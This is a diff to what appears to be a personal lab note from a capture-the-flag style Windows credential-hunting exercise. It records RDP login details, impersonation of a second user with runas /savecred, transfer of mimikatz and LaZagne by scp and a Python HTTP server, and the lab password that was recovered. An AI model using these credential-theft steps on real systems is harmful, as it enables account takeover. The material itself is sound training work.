@@ -120,13 +120,54 @@ totally2brow2harmon@
 
 IP
 ```go
-10.129.247.96
+10.129.234.171
 ```
 
 RDP
 ```go
-xfreerdp /v:10.129.247.96 /u:sadams /p:totally2brow2harmon@ /cert:ignore
+xfreerdp /v:10.129.234.171 /u:sadams /p:totally2brow2harmon@ /cert:ignore
 ```
 
 1) What is the password mcharles uses for OneDrive?
 
+![[Pasted image 20250804220128.png]]
+
+Interactive logon is available, so use `runas` to impersonate the user `mcharles`
+```go
+runas /savecred /user:SRV01\mcharles cmd
+```
+
+I can use `mimikatz` to get the password. First I must transfer the binary over to the Windows target, `mcharles`
+
+#### Transfer mimikatz to target
+
+```go
+scp /usr/bin/mimikatz sadams@10.129.234.171:/C:/Users/sadams/Desktop
+```
+
+>[!error] SCP not transfering
+> For some reason SCP is hanging so I used python http server instead
+>>	python3 -m http.server 9000
+
+>[!error] Mimikatz error
+> When executing `privilege::debug` mimikatz gives the following error message:
+>>	ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
+>
+> I transfered `Lazagne.exe` over to the host to exploit the target system
+
+
+![[Pasted image 20250806081246.png]]
+
+![[Pasted image 20250806081059.png]]
+
+#### Credentials
+
+Username
+```
+mcharles@inlanefreight.local
+```
+
+Password
+```
+Inlanefreight#2025
+```
